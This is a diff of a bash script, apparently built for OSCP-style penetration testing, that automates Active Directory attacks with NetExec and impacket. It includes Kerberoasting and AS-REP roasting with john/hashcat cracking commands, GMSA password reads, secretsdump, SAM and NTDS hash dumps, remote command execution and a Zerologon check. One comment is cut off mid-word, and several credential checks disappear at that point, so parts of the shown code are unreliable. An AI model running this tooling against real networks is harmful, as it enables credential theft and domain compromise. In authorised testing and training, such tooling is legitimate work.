@@ -27,13 +27,37 @@ mkdir -p nxc-enum nxc-enum/smb nxc-enum/ldap
 
 echo -e "\n\033[96m[+] OS info, Name, Domain, SMB versions\033[0m\n"
 # checks if the SMB service is running; returns OS info, name, domain, SMB versions
-unbuffer nxc ldap $IP -u $user -p $pass --get-sid --users | tee nxc-enum/ldap/domain-sid.txt # Domain SID
+# LDAP domain SID (requires credentials)
+if [ -n "$user" ]; then
+    unbuffer nxc ldap $IP -u "$user" -p "$pass" --get-sid --users | tee nxc-enum/ldap/domain-sid.txt
+else
+    echo -e "\n\033[93m[!] Skipping LDAP domain SID (no credentials supplied)\033[0m"
+fi
 
-echo -e "\n\033[96m[+] Checking Guest access\033[0m\n"
-nxc smb $IP -d $domain -u 'guest' -p '' # check for guest access
+# Guest access (requires domain)
+if [ -n "$domain" ]; then
+    echo -e "\n\033[96m[+] Checking Guest access\033[0m"
+    nxc smb $IP -d "$domain" -u 'guest' -p '' # check for guest access
+else
+    echo -e "\n\033[93m[!] Skipping Guest access check (no domain supplied)\033[0m"
+fi
 
-echo -e "\n\033[96m[+] Checking Anonymous access\033[0m\n"
-nxc smb $IP -d $domain -u '' -p '' # check for anonymous access
+# Anonymous access (domain optional)
+echo -e "\n\033[96m[+] Checking Anonymous access\033[0m"
+if [ -n "$domain" ]; then
+    nxc smb $IP -d "$domain" -u '' -p '' # check for anonymous access
+else
+    nxc smb $IP -u '' -p '' # check for anonymous access
+fi
+
+echo -e "\n\033[96m[+] Checking FTP Anonymous access\033[0m"
+timeout 5s nxc ftp $IP -u 'anonymous' -p 'anonymous' --timeout 2
+
+echo -e "\n\033[96m[+] Checking LDAP Anonymous access\033[0m"
+timeout 5s nxc ldap $IP -u '' -p '' --timeout 2
+
+echo -e "\n\033[96m[+] NFS Enumeration (No credentials required)\033[0m"
+unbuffer nxc nfs $IP --shares | tee nxc-enum/smb/nfs-shares.txt
 
 
 
@@ -68,8 +92,9 @@ check_and_suggest() {
 
                 # Enumerate shares to see which ones are accessible
                 echo "Enumerating shares for suggestions..."
-                shares_output=$(nxc smb $IP -d $domain -u $user -p $pass --shares)
-                echo "$shares_output"
+                # Use the already captured output if it contains shares, or run it if needed.
+                # Since we are optimizing to run --shares in the main call, we use $output.
+                shares_output="$output"
                 
                 echo -e "\n\033[92m[+] Suggested connections:\033[0m"
                 echo "$shares_output" | while read -r line; do
@@ -91,6 +116,11 @@ check_and_suggest() {
                 done
                 ;;
             "wmi")
+                if echo "$output" | grep -q "Pwn3d!"; then
+                     echo -e "\033[92m[+] Admin access (Pwn3d!) detected - impacket-wmiexec should work!\033[0m"
+                else
+                     echo -e "\033[93m[!] Valid credentials, but Admin access not detected. impacket-wmiexec might fail (Access Denied).\033[0m"
+                fi
                 echo "impacket-wmiexec '$domain/$user:$pass@$IP'"
                 ;;
             "winrm")
@@ -118,23 +148,31 @@ check_and_suggest() {
 }
 
 echo -e "\n\033[96m[+] Validating credentials\033[0m\n"
-check_and_suggest smb nxc smb $IP -d $domain -u $user -p $pass --timeout 2
-check_and_suggest ldap nxc ldap $IP -d $domain -u $user -p $pass --timeout 2
-check_and_suggest winrm nxc winrm $IP -d $domain -u $user -p $pass --timeout 2
-check_and_suggest mssql nxc mssql $IP -u $user -p $pass --timeout 2
-check_and_suggest ssh nxc ssh $IP -u $user -p $pass --timeout 0.5
-check_and_suggest ftp nxc ftp $IP -u $user -p $pass --timeout 0.5
-check_and_suggest vnc nxc vnc $IP -u $user -p $pass --timeout 0.5
-
-# RPC check using rpcclient
-echo "Checking rpc..."
-rpc_output=$(rpcclient -U "$domain\\$user%$pass" $IP -c "getusername" 2>&1)
-if echo "$rpc_output" | grep -q "Account Name:"; then
-    echo -e "\033[92m[+] Valid credentials for rpc! Suggested command:\033[0m"
-    echo "rpcclient -U '$domain\\$user%$pass' $IP"
-    echo "impacket-rpcdump '$IP' -u '$user' -p '$pass' -d '$domain'"
-    echo ""
+# Build optional flags
+if [ -n "$domain" ]; then
+    DOMAIN_FLAG="-d $domain"
+else
+    DOMAIN_FLAG=""
 fi
+
+if [ -n "$user" ]; then
+    USER_FLAG="-u $user -p $pass"
+else
+    USER_FLAG=""
+fi
+
+# SMB (anonymous allowed, domain optional)
+# Added --shares to check shares in one go
+check_and_suggest smb nxc smb $IP $DOMAIN_FLAG $USER_FLAG --shares --timeout 2
+
+# LDAP requires username (domain optional)
+if [ -n "$user" ]; then
+    check_and_suggest ldap nxc ldap $IP $DOMAIN_FLAG $USER_FLAG --timeout 2
+else
+    echo -e "\n\033[93m[!] Skipping LDAP check (no username supplied)\033[0m"
+fi
+
+# WinRM requires cr
 # nxc rdp $IP -u $user -p $pass # RDP
 # nxc ftp $IP -u $user -p $pass # FTP
 
@@ -149,37 +187,50 @@ impacket-secretsdump "$domain/$user:$pass@$IP" 2>/dev/null | tee nxc-enum/smb/rp
 echo -e "\n\033[96m[+] RPC Endpoint Dump (impacket-rpcdump)\033[0m\n"
 impacket-rpcdump "$IP" -u "$user" -p "$pass" -d "$domain" 2>/dev/null | tee nxc-enum/smb/rpc-rpcdump.txt # Query RPC endpoint information
 
-echo -e "\n\033[96m[+] Listing shared directories\033[0m\n"
-unbuffer nxc smb $IP -u $user -p $pass --shares | tee nxc-enum/smb/shares.txt # List shared directories on the target machine
+if [ -n "$user" ]; then
+    echo -e "\n\033[96m[+] WinRM Enumeration:\033[0m"
+    echo -e "\n\033[91m[+] WinRM Credentials Check\033[0m\n"
+    check_and_suggest winrm unbuffer nxc winrm $IP $DOMAIN_FLAG $USER_FLAG | tee nxc-enum/smb/winrm-credentials.txt
 
-echo -e "\n\033[96m[+] Enumerating domain users\033[0m\n"
-unbuffer nxc smb $IP -u $user -p $pass --users | tee nxc-enum/smb/users.txt # Enumerate domain users / logged-on users on the target machine
-unbuffer nxc ldap $IP -u $user -p $pass --users --active-users | tee nxc-enum/ldap/active-users.txt
+    echo -e "\n\033[91m[+] WinRM Command Execution (whoami)\033[0m\n"
+    unbuffer nxc winrm $IP $DOMAIN_FLAG $USER_FLAG -x whoami | tee nxc-enum/smb/winrm-whoami.txt
+else
+    echo -e "\n\033[93m[!] Skipping WinRM Enumeration (no username supplied)\033[0m"
+fi
 
-echo -e "\n\033[96m[+] Enumerating logged users\033[0m\n"
-unbuffer nxc smb $IP -u $user -p $pass --loggedon-users | tee nxc-enum/smb/logged-users.txt
+# Redundant share listing removed (already checked in validation)
 
-echo -e "\n\033[96m[+] Enumerating Admin users\033[0m\n"
-unbuffer nxc ldap $IP -u $user -p $pass --users --admin-count | tee nxc-enum/ldap/admin-count-users.txt
+if [ -n "$user" ]; then
+    echo -e "\n\033[96m[+] Enumerating domain users\033[0m\n"
+    unbuffer nxc smb $IP $USER_FLAG --users | tee nxc-enum/smb/users.txt
+    unbuffer nxc ldap $IP $USER_FLAG --users --active-users | tee nxc-enum/ldap/active-users.txt
 
-echo -e "\n\033[96m[+] Enumerating domain users by bruteforcing RID\033[0m\n"
-unbuffer nxc smb $IP -u $user -p $pass --rid-brute | tee nxc-enum/smb/rid-bruteforce.txt # enumerate users by bruteforcing RID's 
+    echo -e "\n\033[96m[+] Enumerating logged users\033[0m\n"
+    unbuffer nxc smb $IP $USER_FLAG --loggedon-users | tee nxc-enum/smb/logged-users.txt
 
-echo -e "\n\033[96m[+] Enumerating domain groups\033[0m\n"
-unbuffer nxc smb $IP -u $user -p $pass --groups | tee nxc-enum/smb/domain-groups.txt # Enumerate domain / local groups on the target machine
+    echo -e "\n\033[96m[+] Enumerating Admin users\033[0m\n"
+    unbuffer nxc ldap $IP $USER_FLAG --users --admin-count | tee nxc-enum/ldap/admin-count-users.txt
 
-echo -e "\n\033[96m[+] Enumerating local groups\033[0m\n"
-unbuffer nxc smb $IP -u $user -p $pass --local-groups | tee nxc-enum/smb/local-groups.txt
+    echo -e "\n\033[96m[+] Enumerating domain users by bruteforcing RID\033[0m\n"
+    unbuffer nxc smb $IP $USER_FLAG --rid-brute | tee nxc-enum/smb/rid-bruteforce.txt
 
-echo -e "\n\033[96m[+] Dumping password policy\033[0m\n"
-unbuffer nxc smb $IP -u $user -p $pass --pass-pol | tee nxc-enum/smb/pw-policy.txt # dump password policy of the domain
+    echo -e "\n\033[96m[+] Enumerating domain groups\033[0m\n"
+    unbuffer nxc smb $IP $USER_FLAG --groups | tee nxc-enum/smb/domain-groups.txt
 
+    echo -e "\n\033[96m[+] Enumerating local groups\033[0m\n"
+    unbuffer nxc smb $IP $USER_FLAG --local-groups | tee nxc-enum/smb/local-groups.txt
 
-echo -e "\n\033[96m[+] Trying to execute commands:\033[0m\n"
-nxc smb $IP -u $user -p $pass -x whoami # check if commands can be run
-nxc smb $IP -u $user -p $pass -X '$PSVersionTable' # check if powershell commands can be run
-nxc wmi $IP -u $user -p $pass -x whoami # WMI
-nxc winrm $IP -u $user -p $pass -x whoami # winRM
+    echo -e "\n\033[96m[+] Dumping password policy\033[0m\n"
+    unbuffer nxc smb $IP $USER_FLAG --pass-pol | tee nxc-enum/smb/pw-policy.txt
+
+    echo -e "\n\033[96m[+] Trying to execute commands:\033[0m\n"
+    nxc smb $IP $USER_FLAG -x whoami
+    nxc smb $IP $USER_FLAG -X '$PSVersionTable'
+    nxc wmi $IP $USER_FLAG -x whoami
+    nxc winrm $IP $USER_FLAG -x whoami
+else
+    echo -e "\n\033[93m[!] Skipping User/Group Enumeration & Command Execution (no username supplied)\033[0m"
+fi
 
 # Commented as it may be an auto-exploitation feature (OSCP exam)
 
@@ -192,152 +243,152 @@ nxc winrm $IP -u $user -p $pass -x whoami # winRM
 # echo -e "\n\033[91m[+] Trusted for Delegation:\033[0m\n"
 # unbuffer nxc ldap $IP -u $user -p $pass --trusted-for-delegation | tee nxc-enum/ldap/trusted-delegation.txt  
 
-echo -e "\n\033[91m[+] GMSA Passwords:\033[0m\n"
-unbuffer nxc ldap $IP -u $user -p $pass --users --gmsa | tee nxc-enum/ldap/gmsa.txt  
+if [ -n "$user" ]; then
+    echo -e "\n\033[91m[+] GMSA Passwords:\033[0m\n"
+    unbuffer nxc ldap $IP $USER_FLAG --users --gmsa | tee nxc-enum/ldap/gmsa.txt  
 
-echo -e "\n\033[91m[+] Checking Anti Virus:\033[0m\n"
-unbuffer nxc smb $IP -u $user -p $pass -M enum_av  | tee nxc-enum/ldap/anti_virus.txt  
+    echo -e "\n\033[91m[+] Checking Anti Virus:\033[0m\n"
+    unbuffer nxc smb $IP $USER_FLAG -M enum_av  | tee nxc-enum/ldap/anti_virus.txt  
 
-echo -e "\n\033[96m[+] LDAP Module Enumeration:\033[0m"
+    echo -e "\n\033[96m[+] LDAP Module Enumeration:\033[0m"
 
-echo -e "\n\033[91m[+] Machine Account Quota (maq)\033[0m\n"
-unbuffer nxc ldap $IP -u $user -p $pass --users -M maq | tee nxc-enum/ldap/maq.txt # controls the number of computer accounts a user can create in the domain.
+    echo -e "\n\033[91m[+] Machine Account Quota (maq)\033[0m\n"
+    unbuffer nxc ldap $IP $USER_FLAG --users -M maq | tee nxc-enum/ldap/maq.txt
 
-echo -e "\n\033[91m[+] ADCS Templates\033[0m\n"
-unbuffer nxc ldap $IP -u $user -p $pass --users -M adcs | tee nxc-enum/ldap/adcs.txt # ADCS Enumeration
+    echo -e "\n\033[91m[+] ADCS Templates\033[0m\n"
+    unbuffer nxc ldap $IP $USER_FLAG --users -M adcs | tee nxc-enum/ldap/adcs.txt
 
-echo -e "\n\033[91m[+] User Description\033[0m\n"
-unbuffer nxc ldap $IP -u $user -p $pass --users -M get-desc-users | tee nxc-enum/ldap/desc-users.txt # read user's description
+    echo -e "\n\033[91m[+] User Description\033[0m\n"
+    unbuffer nxc ldap $IP $USER_FLAG --users -M get-desc-users | tee nxc-enum/ldap/desc-users.txt
 
-echo -e "\n\033[91m[+] LDAP Checker\033[0m\n"
-unbuffer nxc ldap $IP -u $user -p $pass --users -M ldap-checker | tee nxc-enum/ldap/ldap-checker.txt # verify if ldap require channel binding or not
+    echo -e "\n\033[91m[+] LDAP Checker\033[0m\n"
+    unbuffer nxc ldap $IP $USER_FLAG --users -M ldap-checker | tee nxc-enum/ldap/ldap-checker.txt
 
-echo -e "\n\033[91m[+] Password Not Required\033[0m\n"
-unbuffer nxc ldap $IP -u $user -p $pass --users --password-not-required | tee nxc-enum/ldap/password-not-required.txt
+    echo -e "\n\033[91m[+] Password Not Required\033[0m\n"
+    unbuffer nxc ldap $IP $USER_FLAG --users --password-not-required | tee nxc-enum/ldap/password-not-required.txt
 
-echo -e "\n\033[91m[+] Trusted For Delegation\033[0m\n"
-unbuffer nxc ldap $IP -u $user -p $pass --users --trusted-for-delegation | tee nxc-enum/ldap/trusted-for-delegation.txt
+    echo -e "\n\033[91m[+] Trusted For Delegation\033[0m\n"
+    unbuffer nxc ldap $IP $USER_FLAG --users --trusted-for-delegation | tee nxc-enum/ldap/trusted-for-delegation.txt
 
-echo -e "\n\033[91m[+] Kerberoasting\033[0m\n"
-rm -f nxc-enum/ldap/kerberoasting.txt kerberoasting.txt 2>/dev/null
-unbuffer nxc ldap $IP -u $user -p $pass --kdcHost $IP --kerberoasting nxc-enum/ldap/kerberoasting.txt
-if [ -s nxc-enum/ldap/kerberoasting.txt ] && grep -q 'krb5tgs' nxc-enum/ldap/kerberoasting.txt 2>/dev/null; then
-    cp nxc-enum/ldap/kerberoasting.txt ./kerberoasting.txt
-    echo -e "\033[92m[+] Kerberoast hashes found! Saved to kerberoasting.txt\033[0m"
-    echo -e "\033[92m[+] Suggested cracking commands:\033[0m"
-    
-    # Detect hash type and suggest correct mode
-    if grep -q 'krb5tgs\$23\$' kerberoasting.txt 2>/dev/null; then
-        echo "# etype 23 (RC4-HMAC) detected"
-        echo "john --wordlist=/usr/share/wordlists/rockyou.txt kerberoasting.txt"
-        echo "hashcat -m 13100 kerberoasting.txt /usr/share/wordlists/rockyou.txt"
+    echo -e "\n\033[91m[+] Kerberoasting\033[0m\n"
+    rm -f nxc-enum/ldap/kerberoasting.txt kerberoasting.txt 2>/dev/null
+    unbuffer nxc ldap $IP $USER_FLAG --kdcHost $IP --kerberoasting nxc-enum/ldap/kerberoasting.txt
+    if [ -s nxc-enum/ldap/kerberoasting.txt ] && grep -q 'krb5tgs' nxc-enum/ldap/kerberoasting.txt 2>/dev/null; then
+        cp nxc-enum/ldap/kerberoasting.txt ./kerberoasting.txt
+        echo -e "\033[92m[+] Kerberoast hashes found! Saved to kerberoasting.txt\033[0m"
+        echo -e "\033[92m[+] Suggested cracking commands:\033[0m"
+        
+        # Detect hash type and suggest correct mode
+        if grep -q 'krb5tgs\$23\$' kerberoasting.txt 2>/dev/null; then
+            echo "# etype 23 (RC4-HMAC) detected"
+            echo "john --wordlist=/usr/share/wordlists/rockyou.txt kerberoasting.txt"
+            echo "hashcat -m 13100 kerberoasting.txt /usr/share/wordlists/rockyou.txt"
+        fi
+        if grep -q 'krb5tgs\$17\$' kerberoasting.txt 2>/dev/null; then
+            echo "# etype 17 (AES128-CTS-HMAC-SHA1-96) detected"
+            echo "john --wordlist=/usr/share/wordlists/rockyou.txt kerberoasting.txt"
+            echo "hashcat -m 19600 kerberoasting.txt /usr/share/wordlists/rockyou.txt"
+        fi
+        if grep -q 'krb5tgs\$18\$' kerberoasting.txt 2>/dev/null; then
+            echo "# etype 18 (AES256-CTS-HMAC-SHA1-96) detected"
+            echo "john --wordlist=/usr/share/wordlists/rockyou.txt kerberoasting.txt"
+            echo "hashcat -m 19700 kerberoasting.txt /usr/share/wordlists/rockyou.txt"
+        fi
+        echo ""
     fi
-    if grep -q 'krb5tgs\$17\$' kerberoasting.txt 2>/dev/null; then
-        echo "# etype 17 (AES128-CTS-HMAC-SHA1-96) detected"
-        echo "john --wordlist=/usr/share/wordlists/rockyou.txt kerberoasting.txt"
-        echo "hashcat -m 19600 kerberoasting.txt /usr/share/wordlists/rockyou.txt"
+
+    echo -e "\n\033[91m[+] AS-REProasting\033[0m\n"
+    rm -f nxc-enum/ldap/asreproasting.txt asreproasting.txt 2>/dev/null
+    unbuffer nxc ldap $IP $USER_FLAG --kdcHost $IP --asreproast nxc-enum/ldap/asreproasting.txt
+    if [ -s nxc-enum/ldap/asreproasting.txt ] && grep -q 'krb5asrep' nxc-enum/ldap/asreproasting.txt 2>/dev/null; then
+        cp nxc-enum/ldap/asreproasting.txt ./asreproasting.txt
+        echo -e "\033[92m[+] AS-REP hashes found! Saved to asreproasting.txt\033[0m"
+        echo -e "\033[92m[+] Suggested cracking commands:\033[0m"
+        
+        # Detect hash type and suggest correct mode
+        if grep -q 'krb5asrep\$23\$' asreproasting.txt 2>/dev/null; then
+            echo "# etype 23 (RC4-HMAC) detected"
+            echo "john --wordlist=/usr/share/wordlists/rockyou.txt asreproasting.txt"
+            echo "hashcat -m 18200 asreproasting.txt /usr/share/wordlists/rockyou.txt"
+        fi
+        if grep -q 'krb5asrep\$17\$' asreproasting.txt 2>/dev/null; then
+            echo "# etype 17 (AES128-CTS-HMAC-SHA1-96) detected"
+            echo "john --wordlist=/usr/share/wordlists/rockyou.txt asreproasting.txt"
+            echo "hashcat -m 19800 asreproasting.txt /usr/share/wordlists/rockyou.txt"
+        fi
+        if grep -q 'krb5asrep\$18\$' asreproasting.txt 2>/dev/null; then
+            echo "# etype 18 (AES256-CTS-HMAC-SHA1-96) detected"
+            echo "john --wordlist=/usr/share/wordlists/rockyou.txt asreproasting.txt"
+            echo "hashcat -m 19900 asreproasting.txt /usr/share/wordlists/rockyou.txt"
+        fi
+        echo ""
     fi
-    if grep -q 'krb5tgs\$18\$' kerberoasting.txt 2>/dev/null; then
-        echo "# etype 18 (AES256-CTS-HMAC-SHA1-96) detected"
-        echo "john --wordlist=/usr/share/wordlists/rockyou.txt kerberoasting.txt"
-        echo "hashcat -m 19700 kerberoasting.txt /usr/share/wordlists/rockyou.txt"
-    fi
-    echo ""
+else
+    echo -e "\n\033[93m[!] Skipping LDAP Enumeration & Roasting (no username supplied)\033[0m"
 fi
 
-echo -e "\n\033[91m[+] AS-REProasting\033[0m\n"
-rm -f nxc-enum/ldap/asreproasting.txt asreproasting.txt 2>/dev/null
-unbuffer nxc ldap $IP -u $user -p $pass --kdcHost $IP --asreproast nxc-enum/ldap/asreproasting.txt
-if [ -s nxc-enum/ldap/asreproasting.txt ] && grep -q 'krb5asrep' nxc-enum/ldap/asreproasting.txt 2>/dev/null; then
-    cp nxc-enum/ldap/asreproasting.txt ./asreproasting.txt
-    echo -e "\033[92m[+] AS-REP hashes found! Saved to asreproasting.txt\033[0m"
-    echo -e "\033[92m[+] Suggested cracking commands:\033[0m"
-    
-    # Detect hash type and suggest correct mode
-    if grep -q 'krb5asrep\$23\$' asreproasting.txt 2>/dev/null; then
-        echo "# etype 23 (RC4-HMAC) detected"
-        echo "john --wordlist=/usr/share/wordlists/rockyou.txt asreproasting.txt"
-        echo "hashcat -m 18200 asreproasting.txt /usr/share/wordlists/rockyou.txt"
-    fi
-    if grep -q 'krb5asrep\$17\$' asreproasting.txt 2>/dev/null; then
-        echo "# etype 17 (AES128-CTS-HMAC-SHA1-96) detected"
-        echo "john --wordlist=/usr/share/wordlists/rockyou.txt asreproasting.txt"
-        echo "hashcat -m 19800 asreproasting.txt /usr/share/wordlists/rockyou.txt"
-    fi
-    if grep -q 'krb5asrep\$18\$' asreproasting.txt 2>/dev/null; then
-        echo "# etype 18 (AES256-CTS-HMAC-SHA1-96) detected"
-        echo "john --wordlist=/usr/share/wordlists/rockyou.txt asreproasting.txt"
-        echo "hashcat -m 19900 asreproasting.txt /usr/share/wordlists/rockyou.txt"
-    fi
-    echo ""
+if [ -n "$user" ]; then
+    echo -e "\n\033[91m[+] Domain Controllers\033[0m\n"
+    unbuffer nxc ldap $IP $USER_FLAG --dc-list | tee nxc-enum/ldap/domain-controllers.txt
+
+    echo -e "\n\033[96m[+] SMB Module Enumeration:\033[0m"
+
+    echo -e "\n\033[91m[+] Spider Plus (Find Interesting Files)\033[0m\n"
+    unbuffer nxc smb $IP $USER_FLAG -M spider_plus | tee nxc-enum/smb/spider-plus.txt
+
+    echo -e "\n\033[91m[+] Check Zerologon Vulnerability\033[0m\n"
+    timeout 30s unbuffer nxc smb $IP $USER_FLAG -M zerologon --timeout 5 | tee nxc-enum/smb/zerologon.txt
+
+    echo -e "\n\033[96m[+] MSSQL Enumeration:\033[0m"
+
+    echo -e "\n\033[91m[+] MSSQL Info\033[0m\n"
+    unbuffer nxc mssql $IP $USER_FLAG | tee nxc-enum/smb/mssql-info.txt
+
+    echo -e "\n\033[91m[+] MSSQL Query (xp_dirtree)\033[0m\n"
+    unbuffer nxc mssql $IP $USER_FLAG -x 'EXEC xp_dirtree "C:\\", 1;' | tee nxc-enum/smb/mssql-xp-dirtree.txt
+
+    echo -e "\n\033[91m[+] MSSQL Query (sp_databases)\033[0m\n"
+    unbuffer nxc mssql $IP $USER_FLAG -x 'EXEC sp_databases;' | tee nxc-enum/smb/mssql-databases.txt
+
+    echo -e "\n\033[96m[+] SSH Enumeration:\033[0m"
+
+    echo -e "\n\033[91m[+] SSH Credentials Check\033[0m\n"
+    unbuffer nxc ssh $IP $USER_FLAG | tee nxc-enum/smb/ssh-credentials.txt
+
+    echo -e "\n\033[91m[+] SSH Command Execution (whoami)\033[0m\n"
+    unbuffer nxc ssh $IP $USER_FLAG -x whoami | tee nxc-enum/smb/ssh-whoami.txt
+
+    echo -e "\n\033[96m[+] FTP Enumeration:\033[0m"
+
+    echo -e "\n\033[91m[+] FTP Credentials Check\033[0m\n"
+    timeout 5s unbuffer nxc ftp $IP $USER_FLAG | tee nxc-enum/smb/ftp-credentials.txt
+
+    echo -e "\n\033[91m[+] FTP Share Enumeration\033[0m\n"
+    timeout 5s unbuffer nxc ftp $IP $USER_FLAG --ls | tee nxc-enum/smb/ftp-shares.txt
+
+    echo -e "\n\033[96m[+] VNC Enumeration:\033[0m"
+
+    echo -e "\n\033[91m[+] VNC Credentials Check\033[0m\n"
+    timeout 5s unbuffer nxc vnc $IP $USER_FLAG | tee nxc-enum/smb/vnc-credentials.txt
+
+    echo -e "\n\033[96m[+] WMI Enumeration:\033[0m"
+
+    echo -e "\n\033[91m[+] WMI Credentials Check\033[0m\n"
+    check_and_suggest wmi unbuffer nxc wmi $IP $USER_FLAG | tee nxc-enum/smb/wmi-credentials.txt
+
+    echo -e "\n\033[91m[+] WMI Command Execution (whoami)\033[0m\n"
+    unbuffer nxc wmi $IP $USER_FLAG -x whoami | tee nxc-enum/smb/wmi-whoami.txt
+
+    echo -e "\n\033[96m[+] SMB Additional Enumeration:\033[0m"
+
+    echo -e "\n\033[91m[+] SAM Hashes Dump\033[0m\n"
+    unbuffer nxc smb $IP $USER_FLAG --sam | tee nxc-enum/smb/sam-hashes.txt
+
+    echo -e "\n\033[91m[+] NTDS Database Dump\033[0m\n"
+    unbuffer nxc smb $IP $USER_FLAG --ntds | tee nxc-enum/smb/ntds-dump.txt
+else
+    echo -e "\n\033[93m[!] Skipping Additional Enumeration (no username supplied)\033[0m"
 fi
-
-echo -e "\n\033[91m[+] Domain Controllers\033[0m\n"
-unbuffer nxc ldap $IP -u $user -p $pass --dc-list | tee nxc-enum/ldap/domain-controllers.txt
-
-echo -e "\n\033[96m[+] SMB Module Enumeration:\033[0m"
-
-echo -e "\n\033[91m[+] Spider Plus (Find Interesting Files)\033[0m\n"
-unbuffer nxc smb $IP -u $user -p $pass -M spider_plus | tee nxc-enum/smb/spider-plus.txt
-
-# echo -e "\n\033[91m[+] Enumerate LSASS Protection\033[0m\n"
-# unbuffer nxc smb $IP -u $user -p $pass -M enum_lsass | tee nxc-enum/smb/enum-lsass.txt
-
-echo -e "\n\033[91m[+] Check Zerologon Vulnerability\033[0m\n"
-unbuffer nxc smb $IP -u $user -p $pass -M zerologon | tee nxc-enum/smb/zerologon.txt
-
-echo -e "\n\033[96m[+] MSSQL Enumeration:\033[0m"
-
-echo -e "\n\033[91m[+] MSSQL Info\033[0m\n"
-unbuffer nxc mssql $IP -u $user -p $pass | tee nxc-enum/smb/mssql-info.txt
-
-echo -e "\n\033[91m[+] MSSQL Query (xp_dirtree)\033[0m\n"
-unbuffer nxc mssql $IP -u $user -p $pass -x 'EXEC xp_dirtree "C:\\", 1;' | tee nxc-enum/smb/mssql-xp-dirtree.txt
-
-echo -e "\n\033[91m[+] MSSQL Query (sp_databases)\033[0m\n"
-unbuffer nxc mssql $IP -u $user -p $pass -x 'EXEC sp_databases;' | tee nxc-enum/smb/mssql-databases.txt
-
-echo -e "\n\033[96m[+] SSH Enumeration:\033[0m"
-
-echo -e "\n\033[91m[+] SSH Credentials Check\033[0m\n"
-unbuffer nxc ssh $IP -u $user -p $pass | tee nxc-enum/smb/ssh-credentials.txt
-
-echo -e "\n\033[91m[+] SSH Command Execution (whoami)\033[0m\n"
-unbuffer nxc ssh $IP -u $user -p $pass -x whoami | tee nxc-enum/smb/ssh-whoami.txt
-
-echo -e "\n\033[96m[+] FTP Enumeration:\033[0m"
-
-echo -e "\n\033[91m[+] FTP Credentials Check\033[0m\n"
-unbuffer nxc ftp $IP -u $user -p $pass | tee nxc-enum/smb/ftp-credentials.txt
-
-echo -e "\n\033[91m[+] FTP Share Enumeration\033[0m\n"
-unbuffer nxc ftp $IP -u $user -p $pass --ls | tee nxc-enum/smb/ftp-shares.txt
-
-echo -e "\n\033[96m[+] VNC Enumeration:\033[0m"
-
-echo -e "\n\033[91m[+] VNC Credentials Check\033[0m\n"
-unbuffer nxc vnc $IP -u $user -p $pass | tee nxc-enum/smb/vnc-credentials.txt
-
-echo -e "\n\033[96m[+] NFS Enumeration:\033[0m"
-
-echo -e "\n\033[91m[+] NFS Share Enumeration\033[0m\n"
-unbuffer nxc nfs $IP --shares | tee nxc-enum/smb/nfs-shares.txt
-
-echo -e "\n\033[96m[+] WMI Enumeration:\033[0m"
-
-echo -e "\n\033[91m[+] WMI Credentials Check\033[0m\n"
-check_and_suggest wmi unbuffer nxc wmi $IP -u $user -p $pass | tee nxc-enum/smb/wmi-credentials.txt
-
-echo -e "\n\033[91m[+] WMI Command Execution (whoami)\033[0m\n"
-unbuffer nxc wmi $IP -u $user -p $pass -x whoami | tee nxc-enum/smb/wmi-whoami.txt
-
-echo -e "\n\033[96m[+] SMB Additional Enumeration:\033[0m"
-
-echo -e "\n\033[91m[+] SAM Hashes Dump\033[0m\n"
-unbuffer nxc smb $IP -u $user -p $pass --sam | tee nxc-enum/smb/sam-hashes.txt
-
-echo -e "\n\033[91m[+] NTDS Database Dump\033[0m\n"
-unbuffer nxc smb $IP -u $user -p $pass --ntds | tee nxc-enum/smb/ntds-dump.txt
 
 # Commented as it may be an auto-exploitation feature (OSCP exam)
 
